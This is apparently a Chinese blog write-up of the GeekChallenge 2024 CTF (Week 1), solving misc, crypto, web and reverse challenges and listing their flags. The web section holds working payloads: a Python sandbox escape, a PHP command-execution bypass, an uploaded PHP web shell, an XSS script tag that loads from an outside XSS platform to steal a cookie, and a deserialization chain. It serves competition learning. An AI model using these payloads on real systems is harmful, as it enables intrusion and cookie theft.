class="toc-number">3.7.1.</span> <span class="toc-text">WhoIsAdmin</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week4"><span class="toc-number">4.</span> <span class="toc-text">Week4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-3"><span class="toc-number">4.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hard-jail"><span class="toc-number">4.1.1.</span> <span class="toc-text">hard_jail</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secret-of-Starven"><span class="toc-number">4.1.2.</span> <span class="toc-text">Secret of Starven</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-3"><span class="toc-number">4.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-LLL"><span class="toc-number">4.2.1.</span> <span class="toc-text">easy_LLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#highlow"><span class="toc-number">4.2.2.</span> <span class="toc-text">highlow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Number-theory"><span class="toc-number">4.2.3.</span> <span class="toc-text">Number theory</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-3"><span class="toc-number">4.3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#not-just-pop"><span class="toc-number">4.3.1.</span> <span class="toc-text">not_just_pop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-python"><span class="toc-number">4.3.2.</span> <span class="toc-text">ez_python</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-3"><span class="toc-number">4.4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-re"><span class="toc-number">4.4.1.</span> <span class="toc-text">ez_re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%9D%E6%96%AF%EF%BC%81%E8%B4%9D%E6%96%AF%EF%BC%81"><span class="toc-number">4.4.2.</span> <span class="toc-text">贝斯！贝斯！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Crypto-1"><span class="toc-number">4.5.</span> <span class="toc-text">Reverse&#x2F;Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Math"><span class="toc-number">4.5.1.</span> <span class="toc-text">Math</span></a></li></ol></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-GeekChallenge2024-第十五届极客大挑战" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">GeekChallenge2024 第十五届极客大挑战</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2024/11/06/match-GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" class="article-date"><time datetime="2024-11-06T13:31:12.000Z" itemprop="datePublished">2024-11-06</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2024%E8%B5%9B/" rel="tag">2024赛</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2024/11/06/match-GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" class="leancloud_visitors" data-flag-title="GeekChallenge2024 第十五届极客大挑战"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2024/11/06/match-GeekChallenge2024-%E7%AC%AC%E5%8D%81%E4%BA%94%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>​</p><p>三叶草安全技术小组第十五届极客大挑战</p><p>极客大挑战是由三叶草安全技术小组自发组织举办的一场全国性网络安全赛事，目前，极客大挑战已成功举办十四届，吸引了超两万五千人次参加，累计提供超1000道赛题，广受全国各地参赛人员好评。作为国内最早一批举办的新生赛，极客大挑战一直以加强行业交流和提供优质学习平台为初心，为广大高校的信息安全学子提供了一个便捷的网络安全实战入门途径。</p><p>线上竞赛 10月18日20:00-11月18日20:00</p><p><strong>Rank: 1</strong></p><hr><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="2024-geek-challenge-签到"><a href="#2024-geek-challenge-签到" class="headerlink" title="2024 geek challenge!签到"></a>2024 geek challenge!签到</h3><blockquote><p>关注小组公众号三叶草小组Syclover,回复关键词 “2024 geek challenge!签到” 进行签到</p></blockquote><p>公众号发关键词，flag：<code>SYC&#123;weLc0mE-tO-2_o_2_100-GeeK@cha11Enge!!&#125;</code>。</p><p>​</p><h3 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h3><blockquote><p>点击就送</p></blockquote><p>base64+reverse+hex，改宽从528到628，图片里得到flag：<code>SYC&#123;Steg_4nd_Zip_1s_G00d!&#125;</code>。</p><p>​</p><h3 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a>Truth of Word</h3><blockquote><p>Word文件真正的奥妙</p></blockquote><p>第一处：</p><p>打开docx文件，修改文字颜色，flag1：<code>Flag01=SYC&#123;W0rd_H@5</code>。</p><p>第二处：</p><p>提取宏代码：<code>olevba vbaProject.bin</code>，得到：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> Flag02()</span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line"><span class="comment">&#x27; Flag02 宏</span></span><br><span class="line"><span class="comment">&#x27;Flag = @_Ama1n9_</span></span><br><span class="line"><span class="comment">&#x27;</span></span><br></pre></td></tr></table></figure><p>第三处：</p><p>以压缩包形式打开docx，<code>word/media</code> 下有 <code>flag03.png</code>，flag3：<code>FLAG03=StrUCtu3e!&#125;</code>。</p><p>flag：<code>SYC&#123;W0rd_H@5@_Ama1n9_StrUCtu3e!&#125;</code>。</p><p>​</p><h3 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a>Welcome_jail</h3><blockquote><p>就是一个简单的pyjail啦</p></blockquote><p>用 <code>chr()</code> 函数连接拼凑字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">d</span>(<span class="params">x</span>):</span><br><span class="line">    t=[]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> x:</span><br><span class="line">        t.append(<span class="string">f&#x27;chr(<span class="subst">&#123;<span class="built_in">ord</span>(k)&#125;</span>)&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(t)</span><br><span class="line">	</span><br><span class="line"><span class="built_in">print</span>(d(<span class="string">&#x27;cat /home/ctf/flag&#x27;</span>))</span><br></pre></td></tr></table></figure><p>payload：</p><p><code>print(&#123;&#125;.__class__.__mro__[1].__subclasses__()[-4].__init__.__globals__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(104)+chr(111)+chr(109)+chr(101)+chr(47)+chr(99)+chr(116)+chr(102)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read())</code></p><p>​</p><h3 id="雪"><a href="#雪" class="headerlink" title="雪"></a>雪</h3><blockquote><p>又到了白色相簿的季节</p></blockquote><p>zip末尾 <code>VzNMQzBNNA==</code>，base64解码得：<code>W3LC0M4</code>。</p><p><code>syclover_WaterMark.png</code> 盲水印提取得：<code>Th1si4st8eK3y</code>，<code>white.txt</code> 再snow解密：</p><p><code>stegsnow -C -p Th1si4st8eK3y white.txt</code></p><p>得flag：<code>SYC&#123;Ma1by_y0u_w1ll_l1k3_sn0w&#125;</code>。</p><p>​</p><h3 id="I-wanna-go-to-SYC"><a href="#I-wanna-go-to-SYC" class="headerlink" title="I_wanna_go_to_SYC"></a>I_wanna_go_to_SYC</h3><blockquote><p>BoBo人觉得iwanna很好玩，但是他打不过去能帮帮它吗？ 题目附件下载链接<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1JCqJ8TkXBYJjPUVJbHMlvg">https://pan.baidu.com/s/1JCqJ8TkXBYJjPUVJbHMlvg</a> 密码:game</p></blockquote><p>gm8decompiler转exe为gmk，再用gamemaker打开。</p><p>在 <code>Rooms-sycroom</code> 发现flag：<code>SYC&#123;NO_PRObLEM_yOU_DO_It_G1Me_LOVER&#125;</code>。</p><p>​</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h3><blockquote><p>凯撒你了解吗？flag前缀为SYC{xx}</p></blockquote><p><code>YEI&#123;CKRIUSK_ZU_2024_MKKQ_INGRRKTMK&#125;</code></p><p>ROT20得到：<code>SYC&#123;WELCOME_TO_2024_GEEK_CHALLENGE&#125;</code></p><p>​</p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>基础RSA，flag前缀为SYC{xx}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line">p = <span class="number">192173332221883349384646293941837353967</span></span><br><span class="line">q = <span class="number">172282016556631997385463935089230918399</span></span><br><span class="line">c = <span class="number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">f =(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse_mod(e,f)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;RSA_is_easy&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="X0R"><a href="#X0R" class="headerlink" title="X0R"></a>X0R</h3><blockquote><p>xor和^有什么区别呢，flag前缀为SYC{</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2 = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line">e1 = f2^e2</span><br><span class="line">enc = e1^f1</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(enc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;mes)_c@3LHobXchblA&#x27;</span></span><br></pre></td></tr></table></figure><p>根据flag头 <code>SYC&#123;</code>，异或得到key是 <code>&gt;&lt;0R</code>，异或 <code>&gt;&lt;0R</code> 得到 <code>SYC&#123;a_part_0f_X0R&#125;</code>。</p><p>​</p><h3 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h3><blockquote><p>dp泄露，flag前缀为SYC{xx}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">c =  <span class="number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span></span><br><span class="line">n =  <span class="number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">dp =  <span class="number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">	<span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">		p=(e*dp-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		q=n//p</span><br><span class="line">		phin=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">		d=gp.invert(e, phin)</span><br><span class="line">		m=gp.powmod(c, d, n)</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">len</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;--------------&#x27;</span>)</span><br><span class="line">		<span class="built_in">print</span>(m)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">		</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;welcome_to_crypto&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><blockquote><p>共模攻击，flag前缀为SYC{xx}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">	<span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		g, y, x = egcd(b % a, a)</span><br><span class="line">		<span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line">e1 = <span class="number">911</span></span><br><span class="line">e2 = <span class="number">967</span></span><br><span class="line">c1 = <span class="number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line">c2 = <span class="number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span> </span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">	s1 = - s1</span><br><span class="line">	c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">	s2 = - s2</span><br><span class="line">	c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;U_can_really_attack&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="不是套娃"><a href="#不是套娃" class="headerlink" title="不是套娃"></a>不是套娃</h3><blockquote><p>一位旅行者兜兜转转，终能抵达终点——可能要多转几个弯，走错几块地 题目附件 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw">https://pan.baidu.com/s/1YQuXvK7wNrhLoCUcmWEMZw</a> 提取码：game</p></blockquote><p>第一层：</p><p><code>-..-/../-./..--.-/.---/../..--.-/--../../..--.-/.--/.-/..--.-/-.--/../..--.-/--../../..--.-/--/---/..--.-/-.--/../..--.-/-../..-/.-/..--.-/--../..</code></p><p>摩斯密码：<code>xin_ji_zi_wa_yi_zi_mo_yi_dua_zi</code></p><p>第二层：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">key &lt;- commander</span><br><span class="line"></span><br><span class="line">KEY = uizrlbzii</span><br><span class="line"></span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii Rsm    o                       o                       o  Bcynirv</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii Rsm</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii Rsm</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br><span class="line">uizrlbzii Rsm             o                       o  Yoxx-nhw        o Bcynirv</span><br><span class="line">+        +        +        +        +        +        +        +        +        +</span><br></pre></td></tr></table></figure><p>可知 <code>uizrlbzii</code> 对应的是 <code>commander</code>，维吉尼亚密码解出key是 <code>sunflower</code>。</p><p>第三层：</p><p><code>a1fdbce928af7aae</code>，cmd5查询得到 <code>HaiKav</code>。</p><p>第四层：</p><p><code>NEFICPIC&amp;CRTCTNEYO</code>，栅栏密码key=3，得到 <code>NICECTF&amp;NICECRYPTO</code>。</p><p>第五层：</p><p><code>tip: 100 -&gt; 13 -&gt; 64 -&gt; 65536</code> ，按照提示，base100+rot13+base64+base65536，得到 <code>原神，启动！</code>。</p><p>得到flag：<code>SYC&#123;H0W_P3RF3C+_YU0_AR3!&#125;</code>。</p><p>​</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="100-的⚪"><a href="#100-的⚪" class="headerlink" title="100%的⚪"></a>100%的⚪</h3><blockquote><p>⚪神启动</p></blockquote><p>circle.html查看源代码中js代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (score == <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="title class_">FfFlLLlllaaaaaggggg</span>= <span class="title function_">atob</span>(<span class="string">&quot;U1lDezVVY0hfQF9XbzBkM3JmVWxfQ2lSYzFlfQ==&quot;</span>);</span><br><span class="line">    <span class="title function_">alert</span>(<span class="title class_">FfFlLLlllaaaaaggggg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Base64解码：<code>SYC&#123;5UcH_@_Wo0d3rfUl_CiRc1e&#125;</code>。</p><p>​</p><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><blockquote><p>Just rce me</p></blockquote><p>php常见绕过，payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /?year=1e10&amp;purpose=rce%0a&amp;GLOBALS[code]=system(&quot;cat%20/flag&quot;);</span><br><span class="line"></span><br><span class="line">start=start%20now&amp;_[2024.geekchallenge.ctf=0e1290633704</span><br></pre></td></tr></table></figure><p>​</p><h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><blockquote><p>Parar说他的黑名单无懈可击，GSBP师傅只花了十分钟就拿下了他的权限，你看看怎么绕过呢</p></blockquote><p>文件上传，抓包，尝试发现只判断了第一次出现的 <code>.php</code>，双写绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryIGjO2RImoANGbOwZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_GET[x]);</span><br><span class="line">------WebKitFormBoundaryIGjO2RImoANGbOwZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">x.php.php</span><br><span class="line">------WebKitFormBoundaryIGjO2RImoANGbOwZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryIGjO2RImoANGbOwZ--</span><br></pre></td></tr></table></figure><p>再访问 <code>uploads/x.php.php?x=cat /flag</code> 得到flag。</p><p>​</p><h3 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h3><blockquote><p>starven师傅想要向他的女神表白，所以他专门写了个表白墙用来写他的甜言蜜语，你能看看他的表白墙有什么问题吗</p></blockquote><p>XSS攻击。</p><p><code>/form</code> 页面提交script攻击代码：<code>&lt;sCRiPt sRC=//xs.pe/maD&gt;&lt;/sCrIpT&gt;</code>，再到 <code>/manager</code> 页面POST url=<a href="http://127.0.0.1，让bot访问主页，触发攻击，在XSS平台拿到cookie，内含flag：">http://127.0.0.1，让bot访问主页，触发攻击，在XSS平台拿到cookie，内含flag：</a></p><p><code>flag=SYC&#123;xxx&#125;</code>。</p><p>​</p><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><blockquote><p>听说pop链很难？来做做我的找找自信吧(如果遇到500报错，请耐心等待几秒钟刷新即可,flag在/flag)</p></blockquote><p>反序列化，绕关键字，用 <code>.htaccess</code> 绕死亡exit：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SYC</span>:</span><br><span class="line">    public_starven=<span class="string">&#x27;php://filter/write=string.strip_tags/?&gt;php_value auto_prepend_file /flag\n#/resource=.htaccess&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Geek</span>:</span><br><span class="line">    public_GSBP=SYC()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lover</span>:</span><br><span class="line">    public_meimeng=Geek()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Geek</span>:</span><br><span class="line">    public_GSBP=lover()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lover</span>:</span><br><span class="line">    public_J1rry=<span class="string">&#x27;data://text/plain,Welcome GeekChallenge 2024&#x27;</span></span><br><span class="line">    public_meimeng=Geek()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(lover())).replace(<span class="string">&#x27;s%3A7%3A%22meimeng&#x27;</span>,<span class="string">&#x27;S%3A7%3A%22\\6deimeng&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A//text/plain%2CWelcome%20GeekChallenge%202024%22%3BS%3A7%3A%22\6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A5%3A%22lover%22%3A1%3A%7BS%3A7%3A%22\6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A3%3A%22SYC%22%3A1%3A%7Bs%3A7%3A%22starven%22%3Bs%3A93%3A%22php%3A//filter/write%3Dstring.strip_tags/%3F%3Ephp_value%20auto_prepend_file%20/flag%0A%23/resource%3D.htaccess%22%3B%7D%7D%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p>得到结果传入data参数，再刷新页面得到flag。</p><p>​</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="hello-re"><a href="#hello-re" class="headerlink" title="hello_re"></a>hello_re</h3><blockquote><p>Welcome to Reverse’s world! 听说010可以看到文件的本质捏</p></blockquote><p>把 <code>SYC0</code> 改 <code>UPX0</code>，upx脱壳，代码逻辑是一个简单的异或操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">52</span>,<span class="number">3</span>,<span class="number">96</span>,<span class="number">47</span>,<span class="number">28</span>,<span class="number">107</span>,<span class="number">15</span>,<span 